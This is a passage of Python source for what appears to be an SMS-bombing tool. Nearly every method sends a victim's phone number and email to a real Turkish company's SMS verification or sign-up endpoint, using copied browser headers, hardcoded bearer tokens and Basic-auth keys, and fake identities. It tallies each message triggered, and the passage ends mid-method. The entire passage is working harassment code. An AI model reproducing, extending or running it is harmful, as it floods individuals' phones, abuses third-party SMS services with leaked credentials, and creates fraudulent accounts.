    def Dgn(self):
        try:
            url = "https://odeme.dgnonline.com:443/index.php?route=ajax/smsconfirm&type=send&ajax=1"
            headers = {"User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:106.0) Gecko/20100101 Firefox/106.0", "Accept": "*/*", "Accept-Language": "tr-TR,tr;q=0.8,en-US;q=0.5,en;q=0.3", "Accept-Encoding": "gzip, deflate", "Content-Type": "application/x-www-form-urlencoded; charset=UTF-8", "X-Requested-With": "XMLHttpRequest", "Origin": "https://odeme.dgnonline.com", "Dnt": "1", "Referer": "https://odeme.dgnonline.com/?bd=1", "Sec-Fetch-Dest": "empty", "Sec-Fetch-Mode": "cors", "Sec-Fetch-Site": "same-origin", "Te": "trailers"}
            data = {"loginIdentityNumber": "00000000000", "loginMobileNumber": self.phone}
            dgn = requests.post(url, headers=headers, data=data)
            if dgn.status_code == 200:
                print(f"{Fore.LIGHTGREEN_EX}[+] {Style.RESET_ALL}Başarılı! {self.phone} --> odeme.dgnonline.com")
                self.adet += 1
            else:
                raise
        except:
            print(f"{Fore.LIGHTRED_EX}[-] {Style.RESET_ALL}Başarısız! {self.phone} --> odeme.dgnonline.com")  
            
    
    #yaanimail.com
    def Yaani(self):
        try:
            url = "https://api.yaanimail.com:443/gateway/v1/accounts/verification-code/send"
            headers = {"User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:107.0) Gecko/20100101 Firefox/107.0", "Content-Type": "application/json"}
            json={"action": "create", "email": f"{''.join(choice(ascii_lowercase) for i in range(19))}@yaani.com", "language": "tr", "recovery_options": [{"type": "email", "value": self.mail}, {"type": "msisdn", "value": f"90{self.phone}"}]}
            r = requests.post(url, headers=headers, json=json)
            if r.status_code == 204:
                print(f"{Fore.LIGHTGREEN_EX}[+] {Style.RESET_ALL}Başarılı! {self.phone} --> api.yaanimail.com")
                self.adet += 1
            else:
                raise
        except:
            print(f"{Fore.LIGHTRED_EX}[-] {Style.RESET_ALL}Başarısız! {self.phone} --> api.yaanimail.com")  
            
             
    #defacto.com.tr
    def Defacto(self):
        try:
            url = "https://www.defacto.com.tr:443/Customer/SendPhoneConfirmationSms"
            headers = {"User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:107.0) Gecko/20100101 Firefox/107.0", "Accept": "*/*", "Accept-Language": "tr-TR,tr;q=0.8,en-US;q=0.5,en;q=0.3", "Accept-Encoding": "gzip, deflate", "Referer": "https://www.defacto.com.tr/Login?newUser=True&ReturnUrl=%2FCustomer%2FSendPhoneConfirmationSms", "Content-Type": "application/x-www-form-urlencoded", "X-Requested-With": "XMLHttpRequest", "Origin": "https://www.defacto.com.tr", "Dnt": "1", "Sec-Fetch-Dest": "empty", "Sec-Fetch-Mode": "cors", "Sec-Fetch-Site": "same-origin", "Te": "trailers"}
            data = {"mobilePhone": self.phone}
            r = requests.post(url, headers=headers, data=data)
            if r.json()["Data"]["IsSMSSend"] == True:
                print(f"{Fore.LIGHTGREEN_EX}[+] {Style.RESET_ALL}Başarılı! {self.phone} --> defacto.com.tr")
                self.adet += 1
            else:
                raise
        except:
            print(f"{Fore.LIGHTRED_EX}[-] {Style.RESET_ALL}Başarısız! {self.phone} --> defacto.com.tr")
    
    
    #mopas.com.tr
    def Mopas(self):
        try:
            r = requests.get(f"https://mopas.com.tr/sms/activation?mobileNumber={self.phone}&pwd=&checkPwd=")
            if r.status_code == 200:
                print(f"{Fore.LIGHTGREEN_EX}[+] {Style.RESET_ALL}Başarılı! {self.phone} --> mopas.com.tr")
                self.adet += 1
            else:
                raise
        except:
            print(f"{Fore.LIGHTRED_EX}[-] {Style.RESET_ALL}Başarısız! {self.phone} --> mopas.com.tr")
            
    
    #icq.net
    def Icq(self):
        try:
            url = "https://u.icq.net:443/api/v92/rapi/auth/sendCode"
            headers = {"User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:107.0) Gecko/20100101 Firefox/107.0", "Accept": "*/*", "Accept-Language": "tr-TR,tr;q=0.8,en-US;q=0.5,en;q=0.3", "Accept-Encoding": "gzip, deflate", "Content-Type": "application/json", "Origin": "https://web.icq.com", "Dnt": "1", "Referer": "https://web.icq.com/", "Sec-Fetch-Dest": "empty", "Sec-Fetch-Mode": "cors", "Sec-Fetch-Site": "cross-site", "Te": "trailers"}
            json={"params": {"application": "icq", "devId": "ic1rtwz1s1Hj1O0r", "language": "en-US", "phone": f"90{self.phone}", "route": "sms"}, "reqId": "25299-1669396271"}
            r = requests.post(url, headers=headers, json=json)
            if r.json()["status"]["code"] == 20000:
                print(f"{Fore.LIGHTGREEN_EX}[+] {Style.RESET_ALL}Başarılı! {self.phone} --> u.icq.net")
                self.adet += 1
            else:
                raise
        except:
            print(f"{Fore.LIGHTRED_EX}[-] {Style.RESET_ALL}Başarısız! {self.phone} --> u.icq.net")
            
    
    #boyner.com
    def Boyner(self):
        try:
            url = "https://www.boyner.com.tr:443/v2/customerV2/Register"
            headers = {"User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:107.0) Gecko/20100101 Firefox/107.0", "Accept": "application/json, text/plain, */*", "Accept-Language": "tr-TR,tr;q=0.8,en-US;q=0.5,en;q=0.3", "Accept-Encoding": "gzip, deflate", "Referer": "https://www.boyner.com.tr/uyelik?type=uye-ol", "X-Newrelic-Id": "Vg8GVlZWCBACUFVRAwkEUFY=", "Newrelic": "eyJ2IjpbMCwxXSwiZCI6eyJ0eSI6IkJyb3dzZXIiLCJhYyI6IjI5MTcwNTAiLCJhcCI6IjMyMjUzNjA4MiIsImlkIjoiODE3YTIyZTZhODQ0OTJlNCIsInRyIjoiMTM0MWRkZThjZWVmMTExMjQ3MGE4NDQ2M2I1YWU4NzgiLCJ0aSI6MTY3MDU1MzA1OTMzNn19", "Traceparent": "00-1341dde8ceef1112470a84463b5ae878-817a22e6a84492e4-01", "Tracestate": "2917050@nr=0-1-2917050-322536082-817a22e6a84492e4----1670553059336", "Content-Type": "application/json;charset=utf-8", "Origin": "https://www.boyner.com.tr", "Dnt": "1", "Sec-Fetch-Dest": "empty", "Sec-Fetch-Mode": "cors", "Sec-Fetch-Site": "same-origin", "Te": "trailers"}
            json={"Captcha": "", "CaptchaTurn": False, "ConfirmNewPassword": "31ABC..abc31", "isGuestQuickBuy": "false", "Main": {"CellPhone": self.phone, "day": "31", "Email": self.mail, "FirstName": "Memati", "genderid": "1", "LastName": "Baş", "month": "12", "ReceiveCampaignMessages": True, "year": 1972}, "MembershipAgreement": True, "MembershipAgreementClone": True, "NewPassword": "31ABC..abc31", "ReturnUrl": "/"}
            r = requests.post(url, headers=headers, json=json)
            if r.json()["Success"] == True:
                print(f"{Fore.LIGHTGREEN_EX}[+] {Style.RESET_ALL}Başarılı! {self.phone} --> boyner.com")
                self.adet += 1
            else:
                raise
        except:
            print(f"{Fore.LIGHTRED_EX}[-] {Style.RESET_ALL}Başarısız! {self.phone} --> boyner.com")
            

    #watsons.com.tr
    def Watsons(self):
        try:
            url = "https://www.watsons.com.tr:443/api/v2/wtctr/phone-verification/phonenumber?lang=tr_TR"
            headers = {"User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:108.0) Gecko/20100101 Firefox/108.0", "Accept": "application/json", "Accept-Language": "tr-TR,tr;q=0.8,en-US;q=0.5,en;q=0.3", "Accept-Encoding": "gzip, deflate", "Referer": "https://www.watsons.com.tr/register", "Content-Type": "application/json;charset=UTF-8", "X-Dtpc": "11$208941126_619h150vEGITDHTLQJAGKPKRHUIMTILDMPAWJTOL-0e0", "Origin": "https://www.watsons.com.tr", "Dnt": "1", "Sec-Fetch-Dest": "empty", "Sec-Fetch-Mode": "cors", "Sec-Fetch-Site": "same-origin", "Pragma": "no-cache", "Cache-Control": "no-cache", "Te": "trailers"}
            json={"countryCode": "TR", "phoneNumber": self.phone}
            r = requests.post(url, headers=headers, json=json)
            if r.status_code == 201:
                print(f"{Fore.LIGHTGREEN_EX}[+] {Style.RESET_ALL}Başarılı! {self.phone} --> watsons.com.tr")
                self.adet += 1
            else:
                raise
        except:
            print(f"{Fore.LIGHTRED_EX}[-] {Style.RESET_ALL}Başarısız! {self.phone} --> watsons.com.tr")
            
    
    #buyursungelsin.com
    def Buyur(self):
        try:
            url = "https://app.buyursungelsin.com:443/api/customer/form/check"
            headers = {"Accept": "*/*", "Content-Type": "multipart/form-data; boundary=m-oxX0qIMHx4yq53IDWOLqk3y0LtyUo0O6o5gtQi3bbjTC6Q69mKx5X5k.aSXRo1J7MU3M", "Accept-Encoding": "gzip, deflate", "Authorization": "Basic Z2Vsc2luYXBwOjR1N3ghQSVEKkctS2FOZFJnVWtYcDJzNXY4eS9CP0UoSCtNYlFlU2hWbVlxM3Q2dzl6JEMmRilKQE5jUmZValduWnI0dTd4IUElRCpHLUthUGRTZ1ZrWXAyczV2OHkvQj9FKEgrTWJRZVRoV21acTR0Nnc5eiRDJkYpSkBOY1Jm", "User-Agent": "Gelsinapp/30 CFNetwork/1335.0.3 Darwin/21.6.0", "Accept-Language": "tr-TR,tr;q=0.9"}
            data = f"--m-oxX0qIMHx4yq53IDWOLqk3y0LtyUo0O6o5gtQi3bbjTC6Q69mKx5X5k.aSXRo1J7MU3M\r\ncontent-disposition: form-data; name=\"fonksiyon\"\r\n\r\ncustomer/form/check\r\n--m-oxX0qIMHx4yq53IDWOLqk3y0LtyUo0O6o5gtQi3bbjTC6Q69mKx5X5k.aSXRo1J7MU3M\r\ncontent-disposition: form-data; name=\"method\"\r\n\r\nPOST\r\n--m-oxX0qIMHx4yq53IDWOLqk3y0LtyUo0O6o5gtQi3bbjTC6Q69mKx5X5k.aSXRo1J7MU3M\r\ncontent-disposition: form-data; name=\"telephone\"\r\n\r\n{self.phone}\r\n--m-oxX0qIMHx4yq53IDWOLqk3y0LtyUo0O6o5gtQi3bbjTC6Q69mKx5X5k.aSXRo1J7MU3M--\r\n"
            r = requests.post(url, headers=headers, data=data)
            if (r.status_code) == 200:
                print(f"{Fore.LIGHTGREEN_EX}[+] {Style.RESET_ALL}Başarılı! {self.phone} --> app.buyursungelsin.com")
                self.adet += 1
            else:
                raise
        except:
            print(f"{Fore.LIGHTRED_EX}[-] {Style.RESET_ALL}Başarısız! {self.phone} --> app.buyursungelsin.com")
            
    
    #idealdata.com.tr
    def Osmanlideal(self):
        try:
            r = requests.get(f"https://osmgck.idealdata.com.tr:7850/X%02REQ_SMSDEMO%02{self.mail}%020{self.phone}")
            if r.status_code == 200:
                print(f"{Fore.LIGHTGREEN_EX}[+] {Style.RESET_ALL}Başarılı! {self.phone} --> osmgck.idealdata.com.tr")
                self.adet += 1
            else:
                raise
        except:
            print(f"{Fore.LIGHTRED_EX}[-] {Style.RESET_ALL}Başarısız! {self.phone} --> osmgck.idealdata.com.tr")
            
    
    #pinarsu.com.tr
    def Pinar(self):
        try:
            url = "https://pinarsumobileservice.yasar.com.tr:443/pinarsu-mobil/api/Customer/SendOtp"
            headers = {"Content-Type": "application/json", "Devicetype": "ios", "Accept": "*/*", "Authorization": "bearer eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJJZCI6ImMyZGFiNzVmLTUxNTUtNGQ4NS1iZjkxLWNkYjQxOTkwMTRiZCIsImlzcyI6Imh0dHA6Ly9sb2NhbGhvc3QvIiwiYXVkIjoiaHR0cDovL2xvY2FsaG9zdC8iLCJpYXQiOjE2NzEyODI2NDcsImV4cCI6MTY4MTY1MDY0N30.WkjMSCamAiYXbanSHYE6LxzII-BjZRtjdyYKMcToWHg", "Accept-Language": "tr-TR;q=1.0, en-TR;q=0.9", "Level": "40202", "Accountid": "062511D3-BF52-4441-A29B-8250E3900931", "Accept-Encoding": "gzip, deflate", "User-Agent": "Yasam Pinarim/4.2.2 (com.pinarsu.PinarSu; build:11; iOS 15.6.1) Alamofire/4.2.2", "Languageid": "D4FF115D-1AB5-4141-8719-A102C3CF9F1E", "Connection": "close"}
            json={"MobilePhone": self.phone}
            r = requests.post(url, headers=headers, json=json)
            if r.text == "true":
                print(f"{Fore.LIGHTGREEN_EX}[+] {Style.RESET_ALL}Başarılı! {self.phone} --> pinarsumobileservice.yasar.com.tr")
                self.adet += 1
            else:
                raise
        except:
            print(f"{Fore.LIGHTRED_EX}[-] {Style.RESET_ALL}Başarısız! {self.phone} --> pinarsumobileservice.yasar.com.tr")
            
    
    #suiste.com
    def Suiste(self):
        try:
            url = "https://suiste.com:443/api/auth/code"
            headers = {"Accept": "application/json", "Content-Type": "application/x-www-form-urlencoded; charset=utf-8", "User-Agent": "suiste/1.5.10 (com.mobillium.suiste; build:1228; iOS 15.6.1) Alamofire/5.6.2", "Accept-Language": "tr", "Accept-Encoding": "gzip, deflate"}
            data = {"action": "register", "gsm": self.phone}
            r = requests.post(url, headers=headers, data=data)
            if r.json()["code"] == "common.success":
                print(f"{Fore.LIGHTGREEN_EX}[+] {Style.RESET_ALL}Başarılı! {self.phone} --> suiste.com")
                self.adet += 1
            else:
                raise
        except:
            print(f"{Fore.LIGHTRED_EX}[-] {Style.RESET_ALL}Başarısız! {self.phone} --> suiste.com")
            
            
    #hayatsu.com.tr
    def Hayat(self):
        try:
            url = "https://www.hayatsu.com.tr:443/api/signup/otpsend"
            json={"mobilePhoneNumber": self.phone}
            r = requests.post(url, json=json)
            if (r.json()["IsSuccessful"]) == True:
                print(f"{Fore.LIGHTGREEN_EX}[+] {Style.RESET_ALL}Başarılı! {self.phone} --> hayatsu.com.tr")
                self.adet += 1
            else:
                raise
        except:
            print(f"{Fore.LIGHTRED_EX}[-] {Style.RESET_ALL}Başarısız! {self.phone} --> hayatsu.com.tr")
            
            
    #pisir.com
    def Pisir(self):
        try:
            r = requests.post("https://api.pisir.com:443/v1/login/",  json={"app_build": "343", "app_platform": "ios", "msisdn": self.phone})
            if r.json()["ok"] == "1":
                print(f"{Fore.LIGHTGREEN_EX}[+] {Style.RESET_ALL}Başarılı! {self.phone} --> api.pisir.com")
                self.adet += 1
            else:
                raise
        except:
            print(f"{Fore.LIGHTRED_EX}[-] {Style.RESET_ALL}Başarısız! {self.phone} --> api.pisir.com")
                
    
    #KimGbIster
    def KimGb(self):
        try:
            r = requests.post("https://3uptzlakwi.execute-api.eu-west-1.amazonaws.com:443/api/auth/send-otp", json={"msisdn": f"90{self.phone}"})
            if r.status_code == 200:
                print(f"{Fore.LIGHTGREEN_EX}[+] {Style.RESET_ALL}Başarılı! {self.phone} --> 3uptzlakwi.execute-api.eu-west-1.amazonaws.com")
                self.adet += 1
            else:
                raise
        except:
            print(f"{Fore.LIGHTRED_EX}[-] {Style.RESET_ALL}Başarısız! {self.phone} --> 3uptzlakwi.execute-api.eu-west-1.amazonaws.com")


    #ikinciyeni.com
    def IkinciYeni(self):
        try:
            url = "https://apigw.ikinciyeni.com:443/RegisterRequest"
            json={"accounttype": 1, "email": self.mail, "isAddPermission": True, "lastName": "Bas", "name": "Memati", "phone": self.phone}
            r = requests.post(url, json=json)
            if (r.json()["isSucceed"]) == True:
                print(f"{Fore.LIGHTGREEN_EX}[+] {Style.RESET_ALL}Başarılı! {self.phone} --> apigw.ikinciyeni.com")
                self.adet += 1
            else:
                raise
        except:
            print(f"{Fore.LIGHTRED_EX}[-] {Style.RESET_ALL}Başarısız! {self.phone} --> apigw.ikinciyeni.com")
            
            
    #terrapizza.com.tr
    def Terra(self):
        try:
            url = "https://api.terrapizza.com.tr:443/api/v1/customers"
            json={"email": self.mail, "emailPermitted": True, "kvkApproved": True, "name": "Memati", "phone": str(self.phone), "smsPermitted": True, "surname": "Bas", "userAgreementApproved": True}
            r = requests.post(url,  json=json)
            if (r.status_code) == 201:
                print(f"{Fore.LIGHTGREEN_EX}[+] {Style.RESET_ALL}Başarılı! {self.phone} --> api.terrapizza.com.tr")
                self.adet += 1
            else:
                raise
        except:
            print(f"{Fore.LIGHTRED_EX}[-] {Style.RESET_ALL}Başarısız! {self.phone} --> api.terrapizza.com.tr")
            
            
    #ipragaz.com.tr
    def IpraGaz(self):
        try:
            url = "https://ipapp.ipragaz.com.tr:443/ipragazmobile/v2/ipragaz-b2c/ipragaz-customer/mobile-register-otp"
            json={"birthDate": "31/08/1975", "carPlate": "31 ABC 31", "name": "Memati Bas", "otp": "", "phoneNumber": str(self.phone), "playerId": ""}
            r = requests.post(url, json=json)
            if (r.json()["phoneNumber"]) == str(self.phone):
                print(f"{Fore.LIGHTGREEN_EX}[+] {Style.RESET_ALL}Başarılı! {self.phone} --> ipapp.ipragaz.com.tr")
                self.adet += 1
            else:
                raise
        except:
            print(f"{Fore.LIGHTRED_EX}[-] {Style.RESET_ALL}Başarısız! {self.phone} --> ipapp.ipragaz.com.tr")
            
             
    #mogazmobilapinew.aygaz.com.tr
    def Mogaz(self):
        try:
            url = "https://mogazmobilapinew.aygaz.com.tr:443/api/Member/UserRegister"
            json={"address": "", "birthDate": "31-08-1975", "city": 0, "deviceCode": "839C5FAF-A7C1-2CDA--6F5414AD2228", "district": 0, "email": self.mail, "isUserAgreement": True, "name": "Memati", "password": "", "phone": self.phone, "productType": 1, "subscription": True, "surname": "Bas"}
            r = requests.post(url, json=json)
            if (r.json()["messageCode"]) == "OK":
                print(f"{Fore.LIGHTGREEN_EX}[+] {Style.RESET_ALL}Başarılı! {self.phone} --> mogazmobilapinew.aygaz.com.tr")
                self.adet += 1
            else:
                raise
        except:
            print(f"{Fore.LIGHTRED_EX}[-] {Style.RESET_ALL}Başarısız! {self.phone} --> mogazmobilapinew.aygaz.com.tr")
            
            
    #ipragaz.com.tr
    def GoMobile(self):
        try:
            r = requests.get(f"https://gomobilapp.ipragaz.com.tr:443/api/v1/0/authentication/sms/send?phone={self.phone}&isRegistered=true")
            if (r.json()["data"]["success"]) == True:
                print(f"{Fore.LIGHTGREEN_EX}[+] {Style.RESET_ALL}Başarılı! {self.phone} --> gomobilapp.ipragaz.com.tr")
                self.adet += 1
            else:
                raise
        except:
            print(f"{Fore.LIGHTRED_EX}[-] {Style.RESET_ALL}Başarısız! {self.phone} --> gomobilapp.ipragaz.com.tr")
            
    
    #petrolofisi.com.tr
    def PetrolOfisi(self):
        try:
            url = "https://mobilapi.petrolofisi.com.tr:443/api/auth/register"
            headers = {"Accept": "*/*", "Content-Type": "application/json", "User-Agent": "Petrol%20Ofisi/78 CFNetwork/1335.0.3 Darwin/21.6.0", "X-Channel": "IOS", "Accept-Language": "tr", "Accept-Encoding": "gzip, deflate", "Connection": "close"}
            json={"approvedContractVersion": "v1", "approvedKvkkVersion": "v1", "contractPermission": True, "deviceId": "", "etkContactPermission": True, "kvkkPermission": True, "mobilePhone": f"0{self.phone}", "name": "Memati", "plate": "31ABC31", "positiveCard": "", "referenceCode": "", "surname": "Bas"}
            r = requests.post(url, headers=headers, json=json)
            if r.status_code == 204:
                print(f"{Fore.LIGHTGREEN_EX}[+] {Style.RESET_ALL}Başarılı! {self.phone} --> mobilapi.petrolofisi.com.tr")
                self.adet += 1
            else:
                raise
        except:
            print(f"{Fore.LIGHTRED_EX}[-] {Style.RESET_ALL}Başarısız! {self.phone} --> mobilapi.petrolofisi.com.tr")
            
    
    #totalistasyonlari.com.tr
    def Total(self):
        try:
            r = requests.post(f"https://mobileapi.totalistasyonlari.com.tr:443/SmartSms/SendSms?gsmNo={self.phone}&api_key=GetDocuments%0A", verify=False)
            if (r.json()["success"]) == True:
                print(f"{Fore.LIGHTGREEN_EX}[+] {Style.RESET_ALL}Başarılı! {self.phone} --> mobileapi.totalistasyonlari.com.tr")
                self.adet += 1
            else:
                raise
        except:
            print(f"{Fore.LIGHTRED_EX}[-] {Style.RESET_ALL}Başarısız! {self.phone} --> mobileapi.totalistasyonlari.com.tr")
            
            
    #opet.com.tr
    def Opet(self):
        try:
            url = "https://api.opet.com.tr:443/api/authentication/register"
            json={"abroadcompanies": ["1", "2", "3"], "birthdate": "1975-08-31T22:00:00.000Z", "cardNo": None, "commencisRadio": "true", "email": self.mail, "firstName": "Memati", "googleRadio": "true", "lastName": "Bas", "microsoftRadio": "true", "mobilePhone": str(self.phone), "opetKvkkAndEtk": True, "plate": "31ABC31"}
            r = requests.post(url, json=json)
            if (r.status_code) == 200:
                print(f"{Fore.LIGHTGREEN_EX}[+] {Style.RESET_ALL}Başarılı! {self.phone} --> api.opet.com.tr")
                self.adet += 1
            else:
                raise
        except:
            print(f"{Fore.LIGHTRED_EX}[-] {Style.RESET_ALL}Başarısız! {self.phone} --> api.opet.com.tr")


    #dolap.com
    def Dolap(self):
        try:
            url = "https://api-gateway.dolap.com:443/member"
            headers = {"Content-Type": "application/json", "Accept": "*/*", "Appversion": "359", "Accept-Language": "tr-TR,tr;q=0.9", "Accept-Encoding": "gzip, deflate", "Categorygroup": "WOMAN", "Access-Token": "", "User-Agent": "dolap/2 CFNetwork/1335.0.3 Darwin/21.6.0", "Appplatform": "ios"}
            json={"advertisingId": "", "campaignAgreement": False, "email": self.mail, "memberCookie": "", "membershipAgreement": True, "nickName": "tingirifistik", "password": "31ABC..abc31", "phoneNumber": self.phone}
            r = requests.put(url, headers=headers, json=json)
            if r.status_code == 200:
                print(f"{Fore.LIGHTGREEN_EX}[+] {Style.RESET_ALL}Başarılı! {self.phone} --> api-gateway.dolap.com")
                self.adet += 1
            else:
                raise
        except:
            print(f"{Fore.LIGHTRED_EX}[-] {Style.RESET_ALL}Başarısız! {self.phone} --> api-gateway.dolap.com")
            

    #heymobility.tech
    def Hey(self):
        try:
            headers = {"Accept": "application/json, text/plain, */*", "Content-Type": "application/json", "Accept-Encoding": "gzip, deflate", "User-Agent": "HEY!%20Scooter/116 CFNetwork/1335.0.3 Darwin/21.6.0", "Accept-Language": "tr"}
            r = requests.post(f"https://heyapi.heymobility.tech:443/V9//api/User/ActivationCodeRequest?organizationId=9DCA312E-18C8-4DAE-AE65-01FEAD558739&phonenumber={self.phone}", headers=headers)
            if (r.json()["IsSuccess"]) == True:
                print(f"{Fore.LIGHTGREEN_EX}[+] {Style.RESET_ALL}Başarılı! {self.phone} --> heyapi.heymobility.tech")
                self.adet += 1
            else:
                raise
        except:
            print(f"{Fore.LIGHTRED_EX}[-] {Style.RESET_ALL}Başarısız! {self.phone} --> heyapi.heymobility.tech")
            

    #tazi.tech
    def Tazi(self):
        try:
            url = "https://mobileapiv2.tazi.tech:443/C08467681C6844CFA6DA240D51C8AA8C/uyev2/smslogin"
            headers = {"Accept": "application/json, text/plain, */*", "Content-Type": "application/json;charset=utf-8", "Accept-Encoding": "gzip, deflate", "User-Agent": "Taz%C4%B1/3 CFNetwork/1335.0.3 Darwin/21.6.0", "Accept-Language": "tr-TR,tr;q=0.9", "Authorization": "Basic dGF6aV91c3Jfc3NsOjM5NTA3RjI4Qzk2MjRDQ0I4QjVBQTg2RUQxOUE4MDFD"}
            json={"cep_tel": self.phone, "cep_tel_ulkekod": "90"}
            r = requests.post(url, headers=headers, json=json)
            if (r.json()["kod"]) == "0000":
                print(f"{Fore.LIGHTGREEN_EX}[+] {Style.RESET_ALL}Başarılı! {self.phone} --> mobileapiv2.tazi.tech")
                self.adet += 1
            else:
                raise
        except:
            print(f"{Fore.LIGHTRED_EX}[-] {Style.RESET_ALL}Başarısız! {self.phone} --> mobileapiv2.tazi.tech")
            
    
    #isbike.istanbul
    def Isbike(self):
        try:
            url = "http://app.isbike.istanbul:80/api/uye/otpsms"
            headers = {"Content-Type": "application/json", "Connection": "close", "Accept": "application/json", "User-Agent": "isbike/1.3.5 (tr.gov.ibb.isbikeNew; build:74; iOS 15.6.1) Alamofire/5.5.0", "Authorization": "Basic aXNiaWtlX3VzcjppX3NiaWtlMTQ/LSo1MyE=", "Accept-Encoding": "gzip, deflate", "Accept-Language": "tr-TR;q=1.0, en-TR;q=0.9"}
            json={"cep_tel": self.phone, "cep_tel_ulkekod": 90, "tip": "MBL_UYE_LOGIN"}
            r = requests.post(url, headers=headers, json=json)
            if (r.json()["sonuc"]["aciklama"]) == "İşlem Başarılı":
                print(f"{Fore.LIGHTGREEN_EX}[+] {Style.RESET_ALL}Başarılı! {self.phone} --> app.isbike.istanbul")
                self.adet += 1
            else:
                raise
        except:
            print(f"{Fore.LIGHTRED_EX}[-] {Style.RESET_ALL}Başarısız! {self.phone} --> app.isbike.istanbul")
            
    
    #n11.com
    def N11(self):
        try:
            url = "https://mobileapi.n11.com:443/mobileapi/rest/v2/msisdn-verification/init-verification?__hapc=F41A0C01-D102-4DBE-97B2-07BCE2317CD3"
            headers = {"Mobileclient": "IOS", "Content-Type": "application/json", "Accept": "*/*", "Authorization": "api_key=iphone,api_hash=9f55d44e2aa28322cf84b5816bb20461,api_random=686A1491-041F-4138-865F-9E76BC60367F", "Clientversion": "163", "Accept-Encoding": "gzip, deflate", "User-Agent": "n11/1 CFNetwork/1335.0.3 Darwin/21.6.0", "Accept-Language": "tr-TR,tr;q=0.9", "Connection": "close"}
            json={"__hapc": "", "_deviceId": "696B171-031N-4131-315F-9A76BF60368F", "channel": "MOBILE_IOS", "countryCode": "+90", "email": self.mail, "gsmNumber": self.phone, "userType": "BUYER"}
            r = requests.post(url, headers=headers, json=json)
            if (r.json()["isSuccess"]) == True:
                print(f"{Fore.LIGHTGREEN_EX}[+] {Style.RESET_ALL}Başarılı! {self.phone} --> mobileapi.n11.com")
                self.adet += 1
            else:
                raise
        except:
            print(f"{Fore.LIGHTRED_EX}[-] {Style.RESET_ALL}Başarısız! {self.phone} --> mobileapi.n11.com")
            
    
    #joker.com.tr
    def Joker(self):
        try:
            url = "https://www.joker.com.tr:443/kullanici/ajax/check-sms"
            headers = {"User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:108.0) Gecko/20100101 Firefox/108.0", "Accept": "application/json, text/javascript, */*; q=0.01", "Accept-Language": "tr-TR,tr;q=0.8,en-US;q=0.5,en;q=0.3", "Accept-Encoding": "gzip, deflate", "Content-Type": "application/x-www-form-urlencoded; charset=UTF-8", "X-Requested-With": "XMLHttpRequest"}
            data = {"phone": self.phone}
            r = requests.post(url, headers=headers, data=data)
            if (r.json()["success"]) == True:
                print(f"{Fore.LIGHTGREEN_EX}[+] {Style.RESET_ALL}Başarılı! {self.phone} --> joker.com.tr")
                self.adet += 1
            else:
                raise
        except:
            print(f"{Fore.LIGHTRED_EX}[-] {Style.RESET_ALL}Başarısız! {self.phone} --> joker.com.tr")


    #e-bebek.com
    def Ebebek(self):
        try:
            r = requests.post("https://api2.e-bebek.com:443/authorizationserver/oauth/token?lang=tr&curr=EUR&client_secret=secret&grant_type=client_credentials&client_id=trusted_client")
            auth = (r.json()["access_token"])
            url = "https://api2.e-bebek.com:443/ebebekwebservices/v2/ebebek/users/anonymous/validate?curr=TRY&lang=tr"
            headers = {"Content-Type": "application/json", "Authorization": f"Bearer {auth}"}
            json={"email": self.mail, "emailAllow": False, "firstName": "Memati", "lastName": "Bas", "password": "31ABC..abc31", "smsAllow": True, "uid": self.phone}
            r = requests.post(url, headers=headers, json=json)
            if r.json()["status"] == "SUCCESS":
                print(f"{Fore.LIGHTGREEN_EX}[+] {Style.RESET_ALL}Başarılı! {self.phone} --> api2.e-bebek.com")
                self.adet += 1
            else:
                raise
        except:
            print(f"{Fore.LIGHTRED_EX}[-] {Style.RESET_ALL}Başarısız! {self.phone} --> api2.e-bebek.com")


    #sakasu.com.tr
    def Saka(self):
        try:
            url = "https://mobilcrm2.saka.com.tr:443/api/customer/login"
            json={"gsm": self.phone}
            r = requests.post(url, json=json)
            if (r.json()["status"]) == 1 :
                print(f"{Fore.LIGHTGREEN_EX}[+] {Style.RESET_ALL}Başarılı! {self.phone} --> mobilcrm2.saka.com.tr")
                self.adet += 1
            else:
                raise
        except:
            print(f"{Fore.LIGHTRED_EX}[-] {Style.RESET_ALL}Başarısız! {self.phone} --> mobilcrm2.saka.com.tr")
            
    
    #gofody.com
    def Gofody(self):
        try:
            url = "https://backend.gofody.com:443/api/v1/enduser/register/"
            json={"country_code": "90", "phone": self.phone}
            r = requests.post(url, json=json)
            if (r.json()["success"]) == True:
                print(f"{Fore.LIGHTGREEN_EX}[+] {Style.RESET_ALL}Başarılı! {self.phone} --> backend.gofody.com")
                self.adet += 1
            else:
                raise
        except:
            print(f"{Fore.LIGHTRED_EX}[-] {Style.RESET_ALL}Başarısız! {self.phone} --> backend.gofody.com")


    #madamecoco.com
    def Madame(self):
        try:
            url = "https://www.madamecoco.com:443/users/registration/"
            headers = {"Content-Type": "multipart/form-data; boundary=mZ1efqJfdLsZpDtAko-rYcDUe1emE8hTNxCWVmbgNDAVpR17T28SZiQpsvCU2b3sNbio7u", "X-Project-Name": "undefined", "Accept": "application/json, text/plain, */*", "X-App-Type": "akinon-mobile", "X-Requested-With": "XMLHttpRequest", "Accept-Language": "tr-TR,tr;q=0.9", "Cache-Control": "no-store", "Accept-Encoding": "gzip, deflate", "X-App-Device": "ios", "Referer": "https://www.madamecoco.com/", "User-Agent": "Madame%20Coco/1 CFNetwork/1335.0.3 Darwin/21.6.0"}
